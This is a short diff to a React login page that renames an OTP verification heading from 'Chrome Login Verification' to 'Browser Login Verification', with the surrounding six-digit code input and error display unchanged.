@@ -104,7 +104,7 @@ export default function LoginPage() {
                 <ShieldCheck size={24} />
               </div>
             </div>
-            <h1 className="mt-4 text-center text-xl font-semibold text-ig-text">Chrome Login Verification</h1>
+            <h1 className="mt-4 text-center text-xl font-semibold text-ig-text">Browser Login Verification</h1>
             <p className="mt-2 text-center text-sm text-ig-muted">Enter the 6-digit code sent to <strong>{destination}</strong>.</p>
             <input value={otp} onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))} inputMode="numeric" maxLength={6} placeholder="000000" autoComplete="one-time-code" className="mt-6 w-full rounded-xl border border-ig-border bg-ig-bg px-4 py-4 text-center text-2xl font-semibold tracking-[0.5em] text-ig-text outline-none" />
             {error && <p className="mt-3 text-center text-sm text-red-500">{error}</p>}
